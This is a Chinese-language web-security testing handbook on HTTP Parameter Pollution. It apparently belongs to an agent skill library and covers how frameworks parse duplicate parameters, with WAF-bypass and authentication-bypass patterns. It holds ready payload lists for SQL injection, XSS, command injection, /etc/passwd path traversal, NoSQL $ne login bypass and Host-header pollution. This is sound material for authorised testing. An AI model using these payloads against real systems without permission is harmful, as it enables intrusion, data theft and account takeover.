# HTTP Parameter Pollution (HPP) 深度手册

← 回主入口 [../../SKILL.md](../../SKILL.md)

> **CWE**: CWE-235 | **OWASP**: WSTG-INPV-04 (变体)
> **核心**: 同名参数多次出现时, 不同框架 / WAF / 后端 对"最终值"的取法不同, 导致 WAF 放行 / 后端越权 / 鉴权绕过
> **赏金**: 中等 $500-$5000, 作为 "绕过工具" 配合其他漏洞链路

---

## 0. First-pass Payload Set

```
?id=1&id=2                       # 最基础
?id=1&id=2&id=3
?role=user&role=admin
?filter=x&filter=';DROP TABLE--
?q=SELECT&q= 1 FROM              # SQL 拆分绕 WAF
?a[]=1&a[]=2&a[]=3               # 数组形式
?a=1;a=2                         # 分号分隔 (ASP)
```

POST body 同理:

```
id=1&id=2
id[]=1&id[]=2
```

---

## 1. 各框架的取值行为对照

| 语言 / 框架 | `?id=1&id=2` 的 `id` 值 |
|-------------|------------------------|
| PHP (`$_GET['id']`) | `2` (最后一个) |
| PHP (`$_GET['id[]']`) | `[1, 2]` (数组) |
| ASP / ASP.NET (`Request["id"]`) | `"1,2"` (逗号拼接) |
| ASP.NET (`Request.QueryString["id"]`) | `"1,2"` |
| Java Servlet (`getParameter`) | `1` (第一个) |
| Java Servlet (`getParameterValues`) | `[1, 2]` |
| Spring MVC `@RequestParam String id` | `"1,2"` (默认拼接) |
| Spring MVC `@RequestParam List<String> id` | `[1, 2]` |
| Node.js Express (`req.query.id`) | `[1, 2]` 或 `"1,2"` (看 querystring 设置) |
| Python Flask (`request.args.get('id')`) | `1` (第一个) |
| Python Flask (`request.args.getlist('id')`) | `[1, 2]` |
| Python Django (`request.GET.get('id')`) | `2` (最后) |
| Ruby Rails | `"2"` 或 `["1", "2"]` 看处理 |
| Go `net/http` (`FormValue`) | `1` (第一个) |
| Go `net/http` (`Form["id"]`) | `["1", "2"]` |

**核心**: 如果 **WAF** 和 **后端** 用不同语言, 二者取值不同时就是漏洞。

---

## 2. 经典攻击模式

### 2.1 WAF 绕过 SQL 注入

场景: WAF 是 PHP 或 ASP, 后端是 Tomcat (Java Servlet)。

```
?id=1&id=' UNION SELECT password FROM admin--
```

- WAF (PHP): 只看最后一个 `id=' UNION...` → 检测到, 可能还是拦
- 若 WAF 只看**第一个** (某些 WAF 规则) → `id=1` 无害, 放行
- Servlet `getParameter("id")` 取第一个 → 但若业务用 `getParameterValues` 取全部然后拼接 → `1,' UNION SELECT...` 送到 SQL

变体: 拆分 SQL 关键字

```
?q=SEL&q=ECT 1 FROM users
# WAF 看第一个 SEL 无害
# 后端拼接成 "SELECT 1 FROM users"
```

### 2.2 鉴权绕过

```
?role=user&role=admin
```

- 鉴权中间件看第一个 `user`, 判断无管理权限但放行
- 业务代码用最后一个 `admin` 执行动作

### 2.3 登录 / 密码字段污染

```
POST /login
username=admin&username=&password=anything&password=real_password
```

部分框架对空值的处理不同, 可能跳过校验。

### 2.4 Cookie 污染

```
Cookie: session=legit; session=forged
```

浏览器按最后一个, 某些反代按第一个, 造成身份不一致。

---

## 3. 数组注入 (PHP / Node 特有)

### 3.1 PHP `$_GET['id']` vs `$_GET['id'][0]`

```php
// 后端代码:
if ($_GET['id'] == 1) { ... }
```

攻击 `?id[]=1` → `$_GET['id']` 是数组, 等式成立 (PHP 类型混淆, 见 [type-juggling.md](type-juggling.md))。

### 3.2 NoSQL 注入 via 数组

```
?username=admin&password[$ne]=x
# Node + MongoDB: password 变成 {$ne: "x"} → 认证绕过
```

见 [sqli-scenarios.md](sqli-scenarios.md) §2。

### 3.3 批量赋值 (Mass Assignment) 结合

```
user[role]=admin&user[role]=user
```

有些 ORM 按第一个赋值, 结合 HPP 可污染字段。

---

## 4. HTTP Header 中的 HPP

```http
X-Forwarded-For: 1.1.1.1
X-Forwarded-For: 127.0.0.1

Host: legit.com
Host: evil.com
```

前后代理对多 Host / 多 XFF 处理不同, 常见于 Cloudflare / Cloudfront + 后端 nginx 组合。

---

## 5. 识别技巧

### 5.1 差异检测

```
# 发送:
curl "https://target.com/api?id=1"
curl "https://target.com/api?id=1&id=2"
curl "https://target.com/api?id=2&id=1"

# 比较响应: 若不同, 说明后端是 "first" 或 "last" 逻辑
# 若都相同, 说明只取一个 (需试数组形式)
```

### 5.2 Error 泄露

有些框架在参数意外是数组时报错:

```
TypeError: Cannot read property 'x' of undefined
Expected string, got Array
```

错误信息直接告诉后端语言 / 框架。

### 5.3 Burp "Intruder Cluster Bomb" 自动测

对关键参数 (id / role / filter / action / redirect) 批量加同名重复, 观察响应差异。

---

## 6. 绕过 WAF 的具体组合

```
# SQLi
?id=1&id=' AND 1=1-- -
?id=/*&id=*/UNION SELECT password FROM admin

# XSS (少见但可行)
?q=<script>&q=alert(1)</script>

# Command Injection
?cmd=ls&cmd=;id

# Path Traversal
?file=legit.txt&file=../../../../etc/passwd
```

---

## 7. Testing Checklist

- [ ] 关键参数都发送重复测: id / role / filter / action / redirect / url
- [ ] 测试数组形式 `?a[]=1&a[]=2`
- [ ] 测试 header 层的 HPP: XFF / Host / Cookie / Authorization
- [ ] 若 WAF 拦截 SQLi / XSS, 用 HPP 拆分尝试绕过
- [ ] 登录/支付等敏感端点特别测
- [ ] 差异测试: 单参数 vs 重复参数 响应对比
- [ ] 测 URL encoded key (如 `a` vs `%61`) 混合
- [ ] 分隔符变体: `&` / `;` / `,`

---

## 8. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| 同名参数合并无差异 | 框架内部逻辑一致, 非漏洞 |
| 仅报 500 | 可能仅解析异常, 未构成鉴权/注入绕过 |
| WAF 拦但后端也拦 | 双重防御, 注入本身就被后端防住 |
| 某个语言 `getParameter` vs `getParameterValues` 混用 | 仅限内部不一致, 需证明外部可利用 |

---

## 9. 影响证明

- **低**: 参数污染可识别 (前后端取值不同), 无直接利用
- **中**: 配合 SQLi / XSS 使 WAF 绕过成功
- **高**: 鉴权绕过 (role / userId 污染, 越权访问)
- **严重**: 密码重置 / 支付字段污染 → 资金损失 / 账号接管

---

## 10. 相关参考

- 主入口 → [../../SKILL.md](../../SKILL.md)
- 类型混淆(数组污染相关) → [type-juggling.md](type-juggling.md)
- SQL 注入 → [sqli.md](sqli.md) + [sqli-scenarios.md](sqli-scenarios.md)
- NoSQL 数组污染 → [sqli-scenarios.md](sqli-scenarios.md) §2
- WAF 绕过 → [../waf-bypass.md](../waf-bypass.md)

---

**CWE**: CWE-235 | **WSTG**: INPV-04 | **CVSS 典型**: 5.3 (WAF 绕过, 需配合其他漏洞) / 7.5 (直接鉴权绕过)
